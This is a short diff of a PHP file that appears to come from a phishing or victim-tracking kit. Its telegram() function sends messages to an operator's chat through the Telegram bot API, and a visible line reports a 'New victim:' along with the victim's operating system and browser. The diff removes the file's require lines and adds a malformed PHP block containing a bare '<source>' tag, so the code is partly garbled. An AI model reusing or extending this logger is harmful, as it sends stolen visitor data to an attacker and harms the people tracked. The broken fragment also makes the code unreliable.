@@ -1,8 +1,5 @@
 <?php
 
-require('functions.php');
-require('config.php');
-
 function telegram($msg) {
         global $telegrambot,$telegramchatid;
         $url = 'https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data = array('chat_id'=>$telegramchatid,'text'=>$msg);
@@ -36,4 +33,10 @@ telegram("New victim:
 
 // Operating system $user_os
 // Browser $user_browser
+?>
+
+<?php
+
+<source>
+
 ?>
